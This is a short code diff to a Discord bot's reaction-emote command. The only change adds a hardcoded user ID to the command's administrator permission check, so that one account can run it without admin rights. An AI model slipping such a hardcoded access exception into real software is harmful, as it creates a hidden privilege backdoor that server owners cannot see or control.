@@ -14,7 +14,7 @@ module.exports = {
 		.addStringOption(option => option.setName("emote").setDescription("Emote or id of emote of reaction").setRequired(true));
     },
 	permitted(member){
-		return member.permissions.has(Permissions.FLAGS.ADMINISTRATOR);
+		return member.permissions.has(Permissions.FLAGS.ADMINISTRATOR) || member.id == 279616229793071105;
 	},
 	async execute(interaction) {
 		const emote = interaction.options.getString("emote");
